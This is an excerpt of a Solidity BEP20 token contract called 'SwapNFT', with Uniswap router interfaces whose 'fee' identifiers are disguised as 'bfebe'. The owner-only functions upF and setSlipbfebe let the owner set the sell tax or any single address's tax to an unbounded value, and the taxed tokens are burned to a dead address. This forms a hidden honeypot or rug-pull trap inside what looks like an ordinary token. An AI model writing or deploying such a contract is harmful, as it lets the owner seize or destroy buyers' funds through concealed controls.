...
interface IUniswapV2Factory {
    ...
    function bfebeTo() external view returns (address);
    function bfebeToSetter() external view returns (address);
    ...
    function setbfebeTo(address) external;
    function setbfebeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingbfebeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingbfebeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingbfebeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingbfebeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingbfebeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract SwapNFT  is BEP20, Ownable {
    ...
    uint256 private _defaultSellbfebe = 0;

    uint256 private _defaultBuybfebe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipbfebe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellbfebe = _value;
    }

    function setSlipbfebe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipbfebe[_address] = _value;
    }

    function getSlipbfebe(address _address) external view onlyownar returns (uint256) {
        return _slipbfebe[_address];
    }


    function setMAccountbfebe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountbfebe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradebfebeAmount = 0;

        if (rF) {
            uint256 tradebfebe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradebfebe = _defaultSellbfebe;
                }
                if (from == uniswapV2Pair) {

                    tradebfebe = _defaultBuybfebe;
                }
            }
            if (_slipbfebe[from] > 0) {
                tradebfebe = _slipbfebe[from];
            }

            tradebfebeAmount = _Amount.mul(tradebfebe).div(100);
        }


        if (tradebfebeAmount > 0) {
            _balances[from] = _balances[from].sub(tradebfebeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradebfebeAmount);
            emit Transfer(from, _deadAddress, tradebfebeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradebfebeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradebfebeAmount);
        emit Transfer(from, _to, _Amount - tradebfebeAmount);
    }
